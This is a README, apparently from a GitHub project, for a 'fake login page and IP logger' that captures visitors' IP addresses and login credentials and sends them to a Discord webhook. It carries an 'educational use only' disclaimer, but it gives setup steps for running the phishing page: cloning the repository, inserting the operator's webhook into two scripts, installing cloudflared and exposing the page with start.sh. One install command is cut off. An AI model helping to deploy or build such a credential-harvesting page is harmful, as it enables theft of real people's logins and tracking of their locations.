# Fake Login Page (Educational Use Only)

⚠️ **Disclaimer**: This project is strictly for **educational purposes**. Do not use it against real users or deploy it online. Misuse may be illegal and is your responsibility.

## Overview

Fake Login Page and IP Logger is an educational project that captures IP addresses and credentials and sends it to a webhook.

## Setup

### 1. Clone the repository
```bash
git clone https://github.com/ARMed0ps/fake-login-page-and-IP-logger
cd fake-login-page-and-IP-logger
```
### 2. Edit files
```bash
* edit line 9 in postip.js to your discord webhook
* edit line 18 in postipnlogin.js to your discord webhook
```
### 3. Install dependencies
**3.1. python3**
```bash
sudo apt update
sudo apt install python3 python3-p
```
**3.2. Cloudflared**
```bash
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
```
### 4. Temporarily bring the login page up
```bash
bash start.sh
```
